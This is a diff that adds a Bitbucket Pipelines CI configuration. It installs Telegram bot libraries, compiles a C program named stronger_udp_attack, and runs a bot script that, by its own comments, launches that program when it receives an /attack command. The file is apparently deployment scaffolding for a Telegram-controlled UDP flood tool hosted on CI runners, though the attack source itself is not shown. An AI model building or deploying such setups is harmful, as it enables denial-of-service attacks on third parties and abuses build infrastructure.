@@ -1,0 +1,28 @@
+image: python:3.8  # Using Python 3.8 image for the pipeline
+
+pipelines:
+  default:
+    - step:
+        name: "Install dependencies, compile C program, and run the bot"
+        caches:
+          - pip
+        script:
+          # Install necessary Python libraries
+          - pip install --upgrade pip
+          - pip3 install pyTelegramBotAPI python-dotenv
+
+          # Install system dependencies for compiling C++ program and other required tools
+          - apt-get update && apt-get install -y g++ make
+
+          # Install Python dependencies for running the bot
+          - pip install python-telegram-bot
+
+          # Compile the C program (stronger_udp_attack.c) into an executable
+          - gcc -o stronger_udp_attack stronger_udp_attack.c -pthread
+
+          # Make sure the compiled C program (`stronger_udp_attack`) is executable
+          - chmod +x stronger_udp_attack
+
+          # Run the soul.py Telegram bot (this will listen for the /attack command)
+          # It will trigger the execution of `stronger_udp_attack` when the attack is initiated
+          - python3 soul.py
